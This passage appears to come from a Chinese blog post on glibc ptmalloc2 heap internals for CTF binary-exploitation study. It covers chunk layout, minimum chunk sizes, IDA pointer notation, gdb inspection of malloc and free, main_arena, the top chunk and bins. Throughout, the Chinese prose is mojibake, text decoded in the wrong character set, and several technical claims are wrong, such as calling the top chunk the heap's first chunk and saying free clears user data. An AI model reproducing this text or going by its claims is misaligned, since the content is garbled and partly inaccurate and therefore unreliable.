<blockquote><p>ä¸€èˆ¬ç©ºé—²çš„ large chunk åœ¨ fd çš„éå†é¡ºåºä¸­ï¼ŒæŒ‰ç…§ç”±å¤§åˆ°å°çš„é¡ºåºæ’åˆ—ã€‚è¿™æ ·åšå¯ä»¥é¿å…åœ¨å¯»æ‰¾åˆé€‚ chunk æ—¶æŒ¨ä¸ªéå†ã€‚</p></blockquote></li></ul><h3 id="å †å—å¤§å°"><a href="#å †å—å¤§å°" class="headerlink" title="å †å—å¤§å°"></a>å †å—å¤§å°</h3><ul><li><p>32ä½ç¨‹åºï¼š</p><ol><li>ç”¨æˆ·åˆ†é…åˆ°çš„æœ€å°å †å—å¤§å°ä¸º<code>17B</code>ï¼š<strong>prev_size(4B) + size(4B) + fd(4B) + bk(4B) + next_chunk-&gt;p(1B)</strong></li><li>è‹¥ç”¨æˆ·ç”³è¯·çš„å¤§å°è¶…è¿‡æœ€å°å †å—å¤§å°ï¼Œä¼šä¸<strong>8B</strong>è¿›è¡Œå¯¹é½</li></ol></li><li><p>64ä½ç¨‹åºï¼š</p><ol><li>ç”¨æˆ·åˆ†é…åˆ°çš„æœ€å°å †å—å¤§å°ä¸º<code>33B</code>ï¼š<strong>prev_size(8B) + size(8B) + fd(8B) + bk(8B) + next_chunk-&gt;p(1B)</strong></li><li>è‹¥ç”¨æˆ·ç”³è¯·çš„å¤§å°è¶…è¿‡æœ€å°å †å—å¤§å°ï¼Œä¼šä¸<strong>16B</strong>è¿›è¡Œå¯¹é½<h3 id="ç©ºé—´å¤ç”¨"><a href="#ç©ºé—´å¤ç”¨" class="headerlink" title="ç©ºé—´å¤ç”¨"></a>ç©ºé—´å¤ç”¨</h3><strong>æè¿°</strong>ï¼š<strong>å½“ä¸€ä¸ª chunk å¤„äºä½¿ç”¨çŠ¶æ€æ—¶ï¼Œå®ƒçš„ä¸‹ä¸€ä¸ª chunk çš„ prev_size æ— æ•ˆ</strong>ã€‚æ‰€ä»¥ä¸‹ä¸€ä¸ª chunk çš„ prev_size ä¹Ÿå¯ä»¥è¢«å½“å‰ chunk ä½¿ç”¨ï¼Œè¿™å°±æ˜¯ chunk çš„ç©ºé—´å¤ç”¨</li></ol></li></ul><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |<span class="params">             Size of previous chunk, <span class="keyword">if</span> unallocated (P clear)  </span>|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |<span class="params">             Size of chunk, <span class="keyword">in</span> bytes                     </span>|A|<span class="params">M</span>|P|<span class="params"></span></span><br><span class="line"><span class="params">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="params">        </span>|             <span class="title class_">User</span> data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line"><span class="keyword">next</span>    .                                                               |<span class="params"></span></span><br><span class="line"><span class="params">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="params">        </span>|             (size of chunk, but used <span class="keyword">for</span> application data)    |<span class="params"></span></span><br><span class="line"><span class="params">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="params">        </span>|             <span class="title class_">Size</span> of <span class="keyword">next</span> chunk, <span class="keyword">in</span> bytes                |<span class="params">A</span>|<span class="number">0</span>|<span class="params">1</span>|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><h2 id="äºŒã€æŒ‡é’ˆä¸åœ°å€"><a href="#äºŒã€æŒ‡é’ˆä¸åœ°å€" class="headerlink" title="äºŒã€æŒ‡é’ˆä¸åœ°å€"></a>äºŒã€æŒ‡é’ˆä¸åœ°å€</h2><p>é¦–å…ˆè¦æ˜ç¡®ç”¨æˆ·åœ¨è°ƒç”¨ malloc å‡½æ•°æ—¶è¿”å›çš„å€¼ä¸º<strong>ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘åˆ†é…åˆ°å †ç©ºé—´ï¼ˆ<em>ç”¨æˆ·æ•°æ®åŒº</em>ï¼‰</strong>ï¼Œè¿™ä¸ªåœ¨æœ€å‰é¢çš„é‚£ä¸ªå›¾ç‰‡ä¹Ÿå·²ç»æ ‡å‡ºæ¥äº†ã€‚<br>æœ‰æ—¶å€™é¢˜ç›®æ˜¯ä»¥æ›´å¤æ‚çš„æƒ…å†µï¼Œç”¨æŒ‡é’ˆæ¥è¡¨ç¤ºæŸä¸ªæ•°æ®ç»“æ„çš„ï¼Œä¾‹å¦‚ä¸‹é¢çš„è¿™ä¸ªå›¾ä¸­çš„ä¾‹å­ï¼š<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226190505.png" alt="Pasted image 20250226190505"><br>first chunkï¼ˆsecond chunkï¼‰è¡¨ç¤ºç¬¬ä¸€å’Œç¬¬äºŒä¸ªç»“æ„ï¼Œ<strong>æ¯ä¸ªç»“æ„ä¸­éƒ½æœ‰ä¸€ä¸ª point_heap æŒ‡é’ˆæ¥æŒ‡å‘å­˜å‚¨ç”¨æˆ·æ•°æ®çš„å †å—ï¼ˆchunk)ã€‚</strong><br><strong>å·¦è¾¹çš„è¿™ä¸ªæœ¬èº«å°±æ˜¯ä¸€ä¸ªå †å—ï¼Œç”¨æ¥å­˜æ”¾ä¸€äº›å…¨å±€ä¿¡æ¯</strong>ã€‚æ¯”å¦‚ max_size å­˜å‚¨äº†èƒ½å¤Ÿå­˜å‚¨çš„æœ€å¤§ç»“æ„æ•°é‡ï¼›exist_num è¡¨ç¤ºå·²ç»å­˜å‚¨çš„ç»“æ„çš„æ•°é‡ã€‚</p><h3 id="IDAä¸­å¸¸è§çš„æŒ‡é’ˆè¡¨ç¤ºå½¢å¼"><a href="#IDAä¸­å¸¸è§çš„æŒ‡é’ˆè¡¨ç¤ºå½¢å¼" class="headerlink" title="IDAä¸­å¸¸è§çš„æŒ‡é’ˆè¡¨ç¤ºå½¢å¼"></a>IDAä¸­å¸¸è§çš„æŒ‡é’ˆè¡¨ç¤ºå½¢å¼</h3><p>åœ¨ IDA ä¼ªä»£ç ä¸­çš„æŒ‡é’ˆå½¢å¼å½¢å¦‚ä¸‹é¢çš„æƒ…å†µï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(qword_6020A8 + <span class="number">8</span>)</span><br></pre></td></tr></table></figure></p><p><strong>è¡¨ç¤ºå–åˆ° qword_6020A8 è¿™ä¸ªåœ°å€åŠ  8 åç§»çš„é‚£ä¸ªåœ°å€å­˜å‚¨çš„å€¼</strong></p><p>æ±‡ç¼–ä»£ç ç­‰åŒäºï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400F</span>85                 mov     rax, cs:qword_6020A8</span><br><span class="line">.text:<span class="number">0000000000400F</span>8C                 mov     rax, [rax+<span class="number">8</span>]</span><br></pre></td></tr></table></figure><br>ç®€å•è½¬åŒ–ä¸€ä¸‹ï¼Œä¹Ÿå°±æ˜¯ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(addr) = [addr]</span><br></pre></td></tr></table></figure></p><h3 id="é“¾è¡¨"><a href="#é“¾è¡¨" class="headerlink" title="é“¾è¡¨"></a>é“¾è¡¨</h3><p>åœ¨ pwn çš„å †é¢˜ç›®ä¸­ï¼Œç»å¸¸ä¼šæœ‰åƒä¸€äº›â€ç¬”è®°ç®¡ç†ç³»ç»Ÿâ€ä¹‹ç±»çš„é¢˜ç›®ï¼Œä¾‹å¦‚ä¸‹é¢è¿™é‡Œä¾‹å­<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226192122.png" alt="Pasted image 20250226192122"><br>ä»£ç æä¾›äº†æœ€åŸºæœ¬çš„å¢åˆ æŸ¥æ”¹çš„åŠŸèƒ½ã€‚è¿™ä¸ªâ€ç¬”è®°â€çš„æ•°æ®ç»“æ„<strong>é€šå¸¸å°±æ˜¯ä½¿ç”¨é“¾è¡¨è¿æ¥èµ·æ¥çš„</strong>ï¼Œè®°å½•äº†å½“å‰ note çš„å¤§å°ã€å±æ€§ã€å†…å®¹ç­‰ç­‰ã€‚<br><strong>ä¾‹å¦‚ï¼Œä¸‹é¢è¿™ä¸ªä¾‹å­å°±æ˜¯ä»¥æŒ‡é’ˆä¸ºåŸºç¡€æ¥å­˜å‚¨è¿™ä¸ª note ç»“æ„çš„</strong>ã€‚è¿™é‡Œçš„ i ä»£è¡¨ note çš„ç´¢å¼•ï¼Œè‹¥è¿™é‡Œçš„ i = 0 æ—¶ï¼š<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226192345.png" alt="Pasted image 20250226192345"><br><code>*(qword_6020A8 + 16)</code> å°±ä»£è¡¨ä» <code>qword_6020A8</code> è¿™ä¸ªåœ°å€å‡ºå†å¾€ååç§» 16 ä¸ªå­—èŠ‚ï¼Œå–åˆ°è¿™ä¸ªåœ°å€å­˜å‚¨çš„å€¼ï¼Œæ¥ç€æŠŠ 1 èµ‹å€¼ç»™è¿™ä¸ªåœ°æ–¹ï¼ˆä¹Ÿå°±æ˜¯æŠŠ 1 å­˜å…¥è¿™ä¸ªåœ°å€)<br>åŒæ ·çš„<code>*(qword_6020A8 + 24)</code> å°±ä»£è¡¨åç§» 24 ä¸ªå­—èŠ‚å¤„çš„å€¼ä¸º len<br>ä¾æ¬¡ç±»æ¨å°±å¯ä»¥åœ¨<strong>ä¸è¿ç»­çš„å†…å­˜ç©ºé—´ä¸­</strong>ï¼ŒæŠŠæ•´ä¸ª note çš„æ•°æ®ç»“æ„å­˜å‚¨ä¸‹æ¥äº†ã€‚</p><h2 id="ä¸‰ã€ç”³è¯·å †å—çš„æœ¬è´¨"><a href="#ä¸‰ã€ç”³è¯·å †å—çš„æœ¬è´¨" class="headerlink" title="ä¸‰ã€ç”³è¯·å †å—çš„æœ¬è´¨"></a>ä¸‰ã€ç”³è¯·å †å—çš„æœ¬è´¨</h2><blockquote><p>å †ç®¡ç†å™¨ ptmalloc2 ä¸»è¦æ˜¯é€šè¿‡ malloc/free å‡½æ•°æ¥åˆ†é…å’Œé‡Šæ”¾å†…å­˜å—ã€‚</p></blockquote><p>ptmalloc2 çš„ä½œç”¨é€šä¿—çš„è®²å°±æ˜¯<strong>ç›¸å½“äºä¸€ä¸ªâ€ä¸­é—´å•†â€</strong>ï¼Œåœ¨ç¨‹åºæƒ³è¦ç”³è¯·å‘ç³»ç»Ÿç”³è¯·å †ç©ºé—´æ—¶ï¼Œè¿™é‡Œçš„ ptmalloc2 å°±ä¼šç”³è¯·ä¸€å—å¾ˆå¤§çš„ç©ºé—´ï¼Œå¹¶æ ¹æ®ç®—æ³•ä»è¿™äº›å†…å­˜ä¸­æŠŠç©ºé—´çœŸæ­£çš„åˆ†é…ç»™ç¨‹åºã€‚</p><p>ç®€å•ç‚¹è¯´å°±æ˜¯ä¸‹é¢è¿™ä¸ªå›¾ä¸­çš„æƒ…å†µï¼š<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226192641.png" alt="Pasted image 20250226192641"></p><h3 id="ç®€ä¾‹"><a href="#ç®€ä¾‹" class="headerlink" title="ç®€ä¾‹"></a>ç®€ä¾‹</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123; </span><br><span class="line"><span class="type">char</span> *p; </span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">10</span>); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure><p>åœ¨ gdb ä¸­è¿›è¡Œè°ƒè¯•ï¼Œåœ¨ call malloc å¤„ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œ<strong>åœ¨è¿™é‡Œä½¿ç”¨ vmmap å‘½ä»¤ï¼ŒæŸ¥çœ‹å†…å­˜åˆ†å¸ƒ</strong>ã€‚å¯ä»¥çœ‹åˆ°æ­¤æ—¶å¹¶æ²¡æœ‰å‘ç°å †æ®µ<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226193759.png" alt="Pasted image 20250226193759"><br>å•æ­¥ n ï¼Œvmmap å‘½ä»¤å†æ¬¡æŸ¥çœ‹å†…å­˜ï¼Œå‘ç°å‡ºç°äº†å †æ®µ<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226193830.png" alt="Pasted image 20250226193830">**<br>åªç”³è¯·äº† 10 å­—èŠ‚çš„å¤§å°ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆè¿™é‡Œçš„ä¸ºä»€ä¹ˆç»™äº†è¿™ä¹ˆå¤§çš„å †æ®µå‘¢ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00602000     ~    0x00623000</span><br></pre></td></tr></table></figure><p>è®¡ç®—ä¸€ä¸‹ï¼Œåˆšå¥½æ˜¯ 132 kB<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(0x00623000-0x00602000)/1024 = 132 kB</span><br></pre></td></tr></table></figure></p><blockquote><p><strong>è¿™132KBçš„å †ç©ºé—´å«åšarenaï¼Œæ­¤æ—¶å› ä¸ºæ˜¯ä¸»çº¿ç¨‹åˆ†é…çš„ï¼Œæ‰€ä»¥è¿™ä¸ªåŒºåŸŸå«åš main arena</strong></p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´è¿™ 132 KB æ˜¯â€å‚å®¶â€ï¼ˆå†…æ ¸ï¼‰æ‰¹å‘ç»™â€ä¸­é—´å•†â€ï¼ˆptmalloc2ï¼‰çš„è´§ç‰©ï¼Œ<strong>ä»¥ä¾¿ä¸‹æ¬¡ç¨‹åºåœ¨å‘ç³»ç»Ÿç”³è¯·å°å†…å­˜çš„æ—¶å€™ï¼Œç›´æ¥å»â€ä¸­é—´å•†â€å»å–å°±è¡Œäº†</strong>ï¼Œä»–å°±ä¼šåœ¨è¿™ 132KB ä¸­æŒ‰ç…§è¦ç”³è¯·â€è´§ç‰©â€çš„å¤šå°‘è¿›è¡Œåˆ†é…ä¸‹å»ã€‚è‹¥â€ä¸­é—´å•†â€ç¼ºè´§äº†è¯ï¼Œptmalloc2 å°±ç»§ç»­å»æ‰¾â€å‚å®¶â€ï¼ˆç³»ç»Ÿå†…æ ¸ï¼‰å»å–è´§</p><h3 id="æŸ¥çœ‹å·²åˆ†é…çš„å †å†…å­˜åˆ†å¸ƒ"><a href="#æŸ¥çœ‹å·²åˆ†é…çš„å †å†…å­˜åˆ†å¸ƒ" class="headerlink" title="æŸ¥çœ‹å·²åˆ†é…çš„å †å†…å­˜åˆ†å¸ƒ"></a>æŸ¥çœ‹å·²åˆ†é…çš„å †å†…å­˜åˆ†å¸ƒ</h3><p>åœ¨ä¸Šé¢æˆ‘ä»¬åŠ¨æ€è°ƒè¯•çš„æ—¶å€™å·²ç»æ‰§è¡Œäº† malloc å‡½æ•°ï¼Œç”³è¯·åˆ°çš„å †æŒ‡é’ˆæ˜¯ä¿å­˜åœ¨ eax ä¸­çš„<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226193941.png" alt="Pasted image 20250226193941"><br>æˆ‘ä»¬è¿™é‡Œä½¿ç”¨ä¸‹é¢è¿™ä¸ªå‘½ä»¤æ¥æŸ¥çœ‹å†…å­˜å †å—æƒ…å†µï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x/32gx 0x602010-0x10</span><br></pre></td></tr></table></figure><ul><li>32ä½çš„ç¨‹åºä½¿ç”¨ x/32xw æ¯”è¾ƒç›´è§‚ä¸€ç‚¹<br>è¿™é‡Œå‡å» 0x10 è¡¨ç¤ºä»å †å—çš„å¤´éƒ¨å¼€å§‹è§‚å¯Ÿï¼ˆåŒ…å« pre size å’Œ size å­—æ®µï¼‰<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226194002.png" alt="Pasted image 20250226194002"><h2 id="å››ã€main-arenaä¸top-chunk"><a href="#å››ã€main-arenaä¸top-chunk" class="headerlink" title="å››ã€main_arenaä¸top chunk"></a>å››ã€main_arenaä¸top chunk</h2><h3 id="main-arena"><a href="#main-arena" class="headerlink" title="main_arena"></a>main_arena</h3>è¿™ä¸ª main_arena å…¶å®å°±æ˜¯ ptmalloc2 å †ç®¡ç†å™¨é€šè¿‡ä¸æ“ä½œç³»ç»Ÿå†…æ ¸è¿›è¡Œäº¤äº’ç”³è¯·åˆ°çš„ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºä¸Šé¢æ‰€è¯´çš„â€æ‰¹å‘â€åˆ°çš„ä¸€å †è´§ç‰©<blockquote><p>å› ä¸ºæ˜¯ä¸»çº¿ç¨‹åˆ†é…çš„ï¼Œæ‰€ä»¥å«åšmain arenaï¼Œé€šè¿‡å¢åŠ  program break location çš„æ–¹å¼æ¥å¢åŠ  main arena çš„å¤§å°ã€‚</p></blockquote></li></ul><p>åœ¨ gdb è°ƒè¯•ä¸­ï¼Œä½¿ç”¨<br>ä½¿ç”¨<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">x/32gx &amp;main_arena</span><br></pre></td></tr></table></figure><br>å¯ä»¥çœ‹åˆ° main_arena çš„å†…å­˜åˆ†é…æƒ…å†µã€‚</p><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>é¡¾åæ€ä¹‰ï¼Œæ˜¯å †ä¸­ç¬¬ä¸€ä¸ªå †å—ã€‚ç›¸å½“äºä¸€ä¸ªâ€å¸¦å¤´å¤§å“¥â€ï¼Œç¨‹åºä»¥ååˆ†é…åˆ°çš„å†…å­˜åˆ°è¦æ”¾åœ¨ä»–çš„åé¢ã€‚</p><blockquote><p>åœ¨ç³»ç»Ÿå½“å‰çš„æ‰€æœ‰ free chunk(æ— è®ºé‚£ç§ bin)ï¼Œéƒ½æ— æ³•æ»¡è¶³ç”¨æˆ·è¯·æ±‚çš„å†…å­˜å¤§å°çš„æ—¶å€™ï¼Œå°†æ­¤ chunk å½“åšä¸€ä¸ªåº”æ€¥æ¶ˆé˜²å‘˜ï¼Œåˆ†é…ç»™ç”¨æˆ·ä½¿ç”¨ã€‚</p></blockquote><p>ç®€å•ç‚¹è¯´ï¼Œä¹Ÿå°±æ˜¯åœ¨ç¨‹åºåœ¨å‘å †ç®¡ç†å™¨ç”³è¯·å†…å­˜æ—¶ï¼Œ<strong>æ²¡æœ‰åˆé€‚çš„å†…å­˜ç©ºé—´å¯ä»¥åˆ†é…ç»™ä»–ï¼Œæ­¤æ—¶å°±ä¼šä» top chunk ä¸Šâ€å‰ªåˆ‡â€ä¸€éƒ¨åˆ†ä½œä¸º chunk åˆ†é…ç»™ä»–</strong></p><h2 id="äº”ã€freeå‡½æ•°å’Œbins"><a href="#äº”ã€freeå‡½æ•°å’Œbins" class="headerlink" title="äº”ã€freeå‡½æ•°å’Œbins"></a>äº”ã€freeå‡½æ•°å’Œbins</h2><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p>free å‡½æ•°çš„ä½¿ç”¨æ˜¯å’Œ bins çš„åˆ†é…æ¯æ¯ç›¸å…³çš„ã€‚ç”¨ä¸€ä¸ªç®€å•çš„ä¾‹å­æ¥ç†è§£ä¸€ä¸‹ free å‡½æ•°çš„å®ç°åŸç†ã€‚<br>ä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="type">char</span> *p;</span><br><span class="line">        p = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(p,<span class="string">&quot;Hello&quot;</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>ç¨‹åºå°† â€œHelloâ€ å­—ç¬¦ä¸²å¤åˆ¶åˆ°ç”³è¯·åˆ°çš„å †å†…å­˜ç©ºé—´ä¸­ã€‚<br>ç¼–è¯‘åç”¨ gdb è°ƒè¯•ï¼Œåœ¨ call memcpy å¤„ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œå•æ­¥åå°† â€œHelloâ€ å¤åˆ¶åˆ°å †å—ä¸­<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226194730.png" alt="Pasted image 20250226194730"><br>ç»§ç»­ä½¿ç”¨ x/32gx 0x602010-0x10 å‘½ä»¤æŸ¥çœ‹å †å—æƒ…å†µ<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226194742.png" alt="Pasted image 20250226194742"><br>ç»§ç»­å•æ­¥ nï¼Œæ‰§è¡Œ free å‡½æ•°ä¹‹åï¼ŒæŸ¥çœ‹å †å—æƒ…å†µ<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226194753.png" alt="Pasted image 20250226194753"><br>è¿™é‡Œå¯ä»¥çœ‹å‡ºåŸæœ¬å †å—ä¸­å­˜å‚¨çš„å†…å®¹å·²ç»è¢«æ¸…ç©ºï¼Œç„¶å<strong>æŸ¥çœ‹ä¸€ä¸‹ main_arena çš„å€¼ï¼Œå‘ç°å…¶ä¸­ +0x8 çš„åç§»å¤„</strong>ï¼Œå­˜å‚¨äº†æŒ‡å‘å·²ç» free äº†çš„æŒ‡é’ˆï¼ˆæŒ‡å‘å¤´éƒ¨ï¼Œè€Œä¸æ˜¯ user data)</li></ul><p>æ‰€ä»¥è°ƒç”¨ free å‡½æ•°ä»¥åç¨‹åºåšäº†ä¸¤ä»¶äº‹ï¼š<br><strong>1.æ¸…ç©ºæ­¤å †å—çš„ user data<br>2.å°†æ­¤å †å—çš„æŒ‡é’ˆå­˜å‚¨åˆ° main_arena ä¸­äº†ï¼ˆæˆ–æ˜¯ fast bin ä¸­ï¼‰</strong></p><h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>bins è¿™ä¸ªæ¦‚å¿µæ˜¯ä¸å†…å­˜å›æ”¶ç›¸å…³çš„ï¼Œä¹Ÿå°±æ˜¯å †ç®¡ç†å™¨ä¼šæ ¹æ®ç”¨æˆ·å·²ç»ç”³è¯·åˆ°çš„å†…å­˜ç©ºé—´å¤§å°è¿›è¡Œé‡Šæ”¾ï¼Œ<strong>æ¥å†³å®šæ”¾å…¥å“ªç±» bins å½“ä½œå»</strong>ã€‚bins ç›´æ¥ç¿»è¯‘è¿‡æ¥å°±æ˜¯â€åƒåœ¾æ¡¶â€çš„æ„æ€ï¼Œæ‰€ä»¥åœ¨ç³»ç»Ÿåœ¨å†³å®šä½¿ç”¨å“ªä¸ª bins æ—¶å¯ä»¥çœ‹ä½œä¸ºâ€åƒåœ¾çš„åˆ†ç±»â€ã€‚<br>ä¸»è¦çš„ bins åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼Œè¿™é‡Œé‡ç‚¹è®²è§£ä¸€ä¸‹ fast binï¼Œå› ä¸º fast bin æ˜¯ä½¿ç”¨åˆ°çš„æœ€å¤šçš„ä¸€ç±»ï¼Œä¹Ÿæ˜¯å…¶ä¸­ç»“æ„æœ€ä¸ºç®€å•çš„ã€‚<br>æè¿°ï¼š</p><ol><li>ç”¨æˆ·freeæ‰çš„å†…å­˜å¹¶ä¸æ˜¯éƒ½ä¼šé©¬ä¸Šå½’è¿˜ç»™ç³»ç»Ÿï¼Œptmallocä¼šç»Ÿä¸€ç®¡ç†heapå’Œmmapæ˜ å°„åŒºåŸŸä¸­çš„ç©ºé—²çš„chunk</li><li>å½“ç”¨æˆ·è¿›è¡Œä¸‹ä¸€æ¬¡åˆ†é…è¯·æ±‚æ—¶ï¼Œptmallocä¼šé¦–å…ˆè¯•å›¾åœ¨ç©ºé—²çš„chunkä¸­æŒ‘é€‰ä¸€å—ç»™ç”¨æˆ·ï¼Œè¿™æ ·å°±é¿å…äº†é¢‘ç¹çš„ç³»ç»Ÿè°ƒç”¨ï¼Œé™ä½äº†å†…å­˜åˆ†é…çš„å¼€é”€</li><li><strong>ptmallocå°†ç›¸ä¼¼å¤§å°çš„chunkç”¨åŒå‘é“¾è¡¨é“¾æ¥èµ·æ¥ï¼Œè¿™æ ·çš„ä¸€ä¸ªé“¾è¡¨è¢«ç§°ä¸ºä¸€ä¸ªbin</strong></li><li>ptmallocä¸€å…±ç»´æŠ¤äº†128ä¸ªbinï¼Œå¹¶ä½¿ç”¨ä¸€ä¸ªæ•°ç»„æ¥å­˜å‚¨è¿™äº›bin</li><li>å †ç®¡ç†å™¨æ ¹æ®ç‰¹ç‚¹ï¼Œå°†å †åˆ†ä¸ºå››ç§ï¼š<strong>fastbin | unsortedbin | smallbin | largebin</strong></li><li>æ•°ç»„ä¸­<strong>bin 1ä¸ºunsorted binï¼›bin 2åˆ°63ä¸ºsmall binï¼›bin 64åˆ°126ä¸ºlarge bin</strong><br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226201008.png" alt="Pasted image 20250226201008"><h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4>é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ä¸ºäº†å¿«é€Ÿé‡æ–°åˆ†é…å›å†…å­˜è€Œå­˜åœ¨çš„ä¸€ä¸ªç»“æ„ã€‚<blockquote><p>fastbinæ‰€åŒ…å«chunkçš„å¤§å°ä¸º16 Bytes, 24 Bytes, 32 Bytes, â€¦ , 80 Bytesã€‚å½“åˆ†é…ä¸€å—è¾ƒå°çš„å†…å­˜(mem&lt;=64 Bytes)æ—¶ï¼Œ<strong>ä¼šé¦–å…ˆæ£€æŸ¥å¯¹åº”å¤§å°çš„fastbinä¸­æ˜¯å¦åŒ…å«æœªè¢«ä½¿ç”¨çš„chunkï¼Œå¦‚æœå­˜åœ¨åˆ™ç›´æ¥å°†å…¶ä»fastbinä¸­ç§»é™¤å¹¶è¿”å›ï¼›å¦åˆ™é€šè¿‡å…¶ä»–æ–¹å¼ï¼ˆå‰ªåˆ‡top chunkï¼‰å¾—åˆ°ä¸€å—ç¬¦åˆå¤§å°è¦æ±‚çš„chunkå¹¶è¿”å›</strong>ã€‚</p></blockquote></li></ol><p><strong>æè¿°ï¼š</strong></p><ol><li>åœ¨32ä½æ“ä½œç³»ç»Ÿä¸­ï¼Œå½“ç”¨æˆ·é‡Šæ”¾çš„å †å—å¤§å°å°äº64Bæ—¶ä½¿ç”¨fastbinè¿›è¡Œç®¡ç†ï¼Œå³chunkç©ºé—´æœ€å¤§ä¸º80å­—èŠ‚</li><li>fastbinåªä½¿ç”¨äº†fdæˆå‘˜ï¼Œæ˜¯ä¸ªå•é“¾è¡¨ç»“æ„</li><li>fastbinä¸ä¼šå¯¹Pä½è¿›è¡Œæ“ä½œï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä¸ä¼šä¸»åŠ¨è¿›è¡Œåˆå¹¶ï¼›åªæœ‰åœ¨æŸäº›ç‰¹å®šæƒ…å†µä¸‹ï¼Œå 